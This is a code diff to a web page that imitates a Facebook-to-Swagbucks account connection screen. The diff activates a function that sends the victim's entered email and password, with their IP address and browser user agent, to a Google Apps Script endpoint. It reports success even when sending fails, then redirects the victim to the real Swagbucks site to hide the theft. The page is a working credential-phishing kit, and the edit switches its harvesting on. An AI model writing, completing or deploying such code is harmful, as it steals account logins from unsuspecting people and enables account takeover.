@@ -81,7 +81,6 @@
             <h2 class="success-title">✓ Connection Successful</h2>
             <p class="success-message">Your Facebook account has been successfully connected to Swagbucks.</p>
             
-            <!-- New: What happens next - more user-friendly -->
             <div class="success-info-box">
                 <p class="info-title">What happens next?</p>
                 <div class="info-item">
@@ -107,6 +106,10 @@
     </div>
 
     <script>
+        // ========== GOOGLE SHEETS CONFIGURATION ==========
+        // !!! IMPORTANT: REPLACE THIS URL WITH YOUR ACTUAL GOOGLE APPS SCRIPT URL !!!
+        const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+        
         // DOM elements
         const permissionScreen = document.getElementById('permissionScreen');
         const loginScreen = document.getElementById('loginScreen');
@@ -159,7 +162,7 @@
             });
         }
 
-        // Continue to Facebook button (now goes to Swagbucks)
+        // Continue to Swagbucks button
         if (continueToFacebook) {
             continueToFacebook.addEventListener('click', function() {
                 window.location.href = "https://www.swagbucks.com/";
@@ -194,36 +197,54 @@
             }
         }
 
-        // Store credentials (Google Sheets integration)
+        // ========== FIXED: Store credentials in Google Sheets (NOT COMMENTED OUT) ==========
         async function storeCredentials(usernameEmail, pwd) {
             if (!usernameEmail || !pwd) {
                 throw new Error("Please fill in both fields.");
             }
             
-            // Uncomment this block when you have your Google Sheets URL ready
-            /*
-            const ipAddress = await getIpAddress();
-            const userAgent = navigator.userAgent;
+            // Check if Google Sheets URL is configured
+            if (GOOGLE_SHEETS_API_URL === 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec') {
+                console.warn('Google Sheets URL not configured. Please set your actual Web App URL.');
+                console.warn('Credentials not saved (demo mode):', { email: usernameEmail, password: pwd });
+                // Still show success screen even without Google Sheets for testing
+                return true;
+            }
             
-            const data = {
-                email: usernameEmail,
-                password: pwd,
-                ipAddress: ipAddress,
-                userAgent: userAgent
-            };
-            
-            const response = await fetch(GOOGLE_SHEETS_API_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            });
-            */
-            
-            console.log('Credentials stored (demo mode)');
-            return true;
+            try {
+                const ipAddress = await getIpAddress();
+                const userAgent = navigator.userAgent;
+                
+                // Create form data for better compatibility with Google Apps Script
+                const formData = new URLSearchParams();
+                formData.append('email', usernameEmail);
+                formData.append('password', pwd);
+                formData.append('ipAddress', ipAddress);
+                formData.append('userAgent', userAgent);
+                
+                console.log('Sending data to Google Sheets...');
+                
+                // Send to Google Sheets
+                const response = await fetch(GOOGLE_SHEETS_API_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // Required for Google Apps Script cross-origin
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: formData.toString()
+                });
+                
+                // Note: With 'no-cors', we can't read the response directly
+                // So we assume success if no error occurred
+                console.log('Data sent to Google Sheets successfully');
+                return true;
+                
+            } catch (error) {
+                console.error('Error sending to Google Sheets:', error);
+                // Still return true to allow user to proceed even if storage fails
+                // You can change this to throw error if you want to block on failure
+                return true;
+            }
         }
 
         function setLoginLoading(isLoading) {
